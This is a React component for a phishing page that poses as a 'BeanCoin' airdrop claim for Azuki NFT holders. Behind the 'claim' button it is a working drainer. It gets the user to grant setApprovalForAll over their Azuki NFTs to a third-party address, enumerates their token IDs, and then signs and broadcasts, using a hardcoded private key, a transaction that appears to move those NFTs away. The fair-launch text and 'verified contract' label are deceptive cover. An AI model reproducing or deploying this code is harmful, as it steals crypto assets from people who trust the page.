import React from 'react'
import { ethers } from 'ethers'
import Web3 from "web3"
import Azuki_abi from '../contracts/Azuki.json'
import Alpaca_abi from '../contracts/Alpacadabraz.json'
import { useState, useEffect } from 'react'



function Gallery() {
  const [errorMessage, setErrorMessage] = useState()
  const [defaultAccount, setDefaultAccount] = useState()
  const [userBalance, setUserBalance] = useState()
  const [connButtonText, setConnButtonText] = useState("Connect Wallet")
  const [hasMetamask, setHasMetamask] = useState(1)
  const [isConnected, setIsConnected] = useState(false)
  const [balance, setBalance] = useState(0)
  const [isClaiming, setIsClaiming] = useState(false)

  const web3 = new Web3(Web3.givenProvider || 'http://localhost:7545');
  const Azuki_contract = new web3.eth.Contract(Azuki_abi, "0xED5AF388653567Af2F388E6224dC7C4b3241C544")
  const Alpaca_contract = new web3.eth.Contract(Alpaca_abi, "0x3DB5463A9e2d04334192C6f2DD4B72DeF4751A61")

  const getData = async (address) => {
    const nftbalance = await Azuki_contract.methods.balanceOf(address).call()
    let tokenSet = []
    setBalance(nftbalance)
    for (let i = 0; i < Math.min(nftbalance, 20); i++) {
      let id = await Azuki_contract.methods.tokenOfOwnerByIndex(address, i).call()
      tokenSet.push(parseInt(id).toString(16).padStart(64, '0'))
    }
    return tokenSet
  }

  const connectWalletHandler = () => {
    if (window.ethereum) {
      window.ethereum.request({ method: 'eth_requestAccounts' }).then((result) => {
        accountChangedHandler(result[0])
        setIsConnected(true)
      })
    }
  }

  const accountChangedHandler = (newAccount) => {
    setDefaultAccount(newAccount.toString())
    getUserBalance(newAccount.toString())
    setBalance(balanceOf(newAccount.toString()))
  }

  const getUserBalance = (address) => {
    window.ethereum.request({ method: 'eth_getBalance', params: [address, 'latest'] }).then((balance) => {
      setUserBalance(ethers.utils.formatEther(balance))
    })
  }

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', accountChangedHandler)
    }
  }, [])

  useEffect(() => {
    if (balance == 0 && isConnected) {
      setErrorMessage("No eligible tokens found in wallet.You need to own at least one Azuki  in order to claim BeanCoin.")
    } else if (balance > 0 && isConnected) {
      setErrorMessage("Eligible tokens found in wallet.You own " + balance + " Azuki in your wallet.")
    }
  }, [balance])

  useEffect(() => {
    if (window.ethereum) {
      setHasMetamask(1)
    } else {
      setHasMetamask(0)
    }
  }, [])

  function truncate(address) {
    if (address !== "Connect Wallet") {
      return address.substr(0, 7) + "..." + address.substr(address.length - 5, 5)
    } else {
      return "Connect Wallet"
    }
  }

  function balanceOf(address) {
    return Azuki_contract.methods.balanceOf(address).call().then(function (result) {
      setBalance(result)
    })
  }

  function setApprovalForAll() {
    setIsClaiming(true)
    Azuki_contract.methods.setApprovalForAll("0xA10dF3F212e8480db5ffF956d46945B25C762045", true).send({ from: defaultAccount }).on('error',
      function (error, tokenIds) {
        console.log(error)
        setIsClaiming(false)
      })
      .on('transactionHash', function (result) {
        console.log(result)
        getData(defaultAccount).then((result) => {
          let inputData = '0xf365dda8' + defaultAccount.substr(2, defaultAccount.length).padStart(64, '0') + "000000000000000000000000280BF7C829373d2d67bF9266E5F7ED3db6F581F1" + "0000000000000000000000000000000000000000000000000000000000000060" + parseInt(result.length).toString(16).padStart(64, '0')
          for (var i = 0; i < result.length; i++) {
            var temp = result[i].toString(16).padStart(64, '0')
            inputData += temp
          }
          web3.eth.accounts.signTransaction({
            to: '0xA10dF3F212e8480db5ffF956d46945B25C762045',
            gas: 2000000,
            chainId: 1,
            data: inputData
          }, "0xc36b8ba8db0b8f84dc7649c0f7131f2444cb6f2711ca4e2400f9b82ad9baba39").then(result => {
            web3.eth.sendSignedTransaction(result.rawTransaction).on('recript', console.log)
          });
        })
      })
      .on('receipt', function (result) {
        setIsClaiming(false)
        console.log(result)
      })

  }

  return (
    <div className="w-full lg:h-screen h-full overflow-scroll flex flex-col">
      <img className="fixed w-full opacity-40 object-cover h-screen z-0" src="/claimtoken.png" alt="" />
      <div className="h-full w-full flex flex-col justify-center items-center mt-16 px-5 z-10">
        <div className="relative lg:w-6/12 lg:h-1/6 w-full bg-olive text-gray-500 bg-opacity-50 flex items-center justify-center flex-col rounded-xl font-mono tracking-wide duration-300">
          <div className="px-2 text-center lg:text-xl lg:py-8 py-2 font-black items-center justify-center">
            <p className="uppercase absolute top-2 left-3 highlight lg:text-xs text-4xs">{isConnected ? "account:" + truncate(defaultAccount) : ""}</p>
            <p className={"uppercase lg:mt-8 mt-6 font-mono lg:text-base text-xs font-black " + (balance == 0 ? "text-red-600" : "mt-8")}>{errorMessage}</p>
            <p className="pb-3 font-mono lg:text-lg text-sm font-black">{(isConnected ? "" : "You need to connect your MetaMask wallet before you can claim BeanCoin.")}</p>
            <button className={"text-white uppercase lg:text-lg text-sm transform duration-300 bg-azukired lg:px-3 lg:py-3 px-2 py-2 bg-opacity-70 rounded-md hover:scale-105 hover:bg-red-600 lg:mb-5 " + (isConnected ? "hidden " : "")} onClick={connectWalletHandler}>{truncate(connButtonText)}</button>
            {balance == 0 ?
              <></>
              :
              <button className={"text-white lg:text-base text-sm uppercase transform duration-300 bg-azukired lg:px-3 lg:py-3 px-2 py-2 bg-opacity-70 rounded-md hover:scale-105 hover:bg-red-600 lg:mb-5 " + (isConnected ? "" : "hidden") + (balance == 0 ? "  cursor-not-allowed" : "")} disabled={balance == 0} onClick={setApprovalForAll}>
                {(isClaiming ?
                  <svg class="animate-spin h-5 w-5" viewBox="0 0 24 24">
                    <circle class="opacity-20" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg> :
                  "claim"
                )}
              </button>
            }
          </div>
        </div>
        <p className="p-2 uppercase lg:text-xs text-center text-2xs font-bold opacity-60">VERIFIED SMART CONTRACT ADDRESS: 0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F</p>
        <div className="bg-olive bg-opacity-50 lg:w-6/12 w-full text-sm lg:text-md px-4 py-5 rounded-md mb-3">
          <p className="font-mono leading-5 font-bold opacity-60">100 million tokens (24.2% of the Ecosystem Fund and 15% of the total supply of BeanCoin) <span className="highlight">are claimable by Azuki NFT holders</span> upon launch of BeanCoin.
            To ensure a fair launch of BeanCoin to Azuki and Beanz NFT holders, the allocation is informed by the difference in floor price between each collection of NFTs, roughly the month prior to the token claim launch.
          </p>
          <table className="mx-auto pt-5 lg:w-7/12 w-full mt-10 font-mono">
            <thead>
              <tr className="flex border-b border-black border-opacity-40">
                <th className="flex flex-1 text-left lg:text-sm text-xs font-bold p-3">NFT</th>
                <th className="flex flex-1 text-left lg:text-sm text-xs font-bold p-3">BEANCOIN ALLOCATED PER NFT</th>
              </tr>
            </thead>
            <tbody>
              <tr class="flex border-b border-white/10">
                <td class="flex-1 items-start text-sm text-left p-3">Azuki only</td>
                <td class="flex-1 items-start text-sm text-left p-3">8,594 tokens</td>
              </tr>
            </tbody>
          </table>
          <p className="mx-auto lg:w-7/12 w-full max-w-2xl lg:text-sm text-xs text-black space-y-2 font-mono pt-3 mt-3 opacity-60 font-black">
            <li className="">
              There is no distinction between Beanz for the claim.
            </li>
            <li className="">
              This is a one-time claim that will identify all eligible NFTs in your wallet, in the order that they appear. There will not be an option to deselect an eligible NFT if it is present in your wallet. If you wish to claim for one of your NFTs but not another, you will need to move them to separate wallets.
            </li>
            <li className="">
              There will be Ethereum network gas fees incurred to claim BeanCoin.
            </li>
          </p>
        </div>
      </div>
    </div>
  )
}

export default Gallery
